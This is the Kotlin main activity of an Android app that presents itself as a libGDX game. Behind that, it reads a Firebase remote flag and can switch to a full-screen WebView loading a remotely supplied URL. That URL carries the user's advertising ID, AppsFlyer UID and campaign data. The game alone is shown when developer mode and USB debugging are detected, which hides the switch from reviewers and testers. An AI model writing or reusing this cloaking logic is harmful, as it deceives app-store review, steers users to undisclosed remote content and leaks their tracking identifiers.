package com.god.sof.olym.pus

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.god.sof.olym.pus.databinding.ActivityMainBinding
import com.god.sof.olym.pus.util.AppsflyerUtil
import com.god.sof.olym.pus.util.Completer
import com.god.sof.olym.pus.util.DataStoreManager
import com.god.sof.olym.pus.util.Lottie
import com.god.sof.olym.pus.util.Once
import com.god.sof.olym.pus.util.internetConnection
import com.god.sof.olym.pus.util.isDevMode
import com.god.sof.olym.pus.util.isUSB
import com.god.sof.olym.pus.util.log
import com.god.sof.olym.pus.webView.WebViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val FORTiNA_ID = 10
        var sequojaURL       = ""

        val misterSaturnFragment = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            proverkaDatas()
//            startFragUID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                misterSaturnFragment.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.backi)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        FORTiNA_ID          -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.forion)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(2_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun proverkaDatas() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good Morning" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        sequojaURL = it
                        misterSaturnFragment.emit(FORTiNA_ID)
                    }
                }
                "Fata Jena" -> {
                    log("DataStoreManager Key = GAME")
                    misterSaturnFragment.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) openFataJena()
                    else poluchitBolshe()
                }
            }
        }
    }

    private fun poluchitBolshe() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        coroutine.launch {
                            val jsonData = JSONObject(getString("wooden"))
                            log("success = $jsonData")

                            checkushka(
                                state = jsonData.getBoolean("state"),
                                hold  = jsonData.getString("hold")
                            )
                        }
                    } else {
                        misterSaturnFragment.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    misterSaturnFragment.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private suspend fun checkushka(state: Boolean, hold: String) {
        if (state) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 1) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID  = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val ogo = hold + "?" +
                            "adoreyou=${advertisingId}&" +
                            "applyj=${appsflyerUID}&" +
                            "cammander=${AppsflyerUtil.campaignFlow.value}"

                    log("ogo = $ogo")

                    openGoodMorning(ogo)
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else openFataJena()
    }

    private fun openFataJena() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Fata Jena" }
            misterSaturnFragment.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openGoodMorning(color: String) {
        sequojaURL = color
        misterSaturnFragment.tryEmit(FORTiNA_ID)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Good Morning" }
            DataStoreManager.Link.update { sequojaURL }
        }
    }

}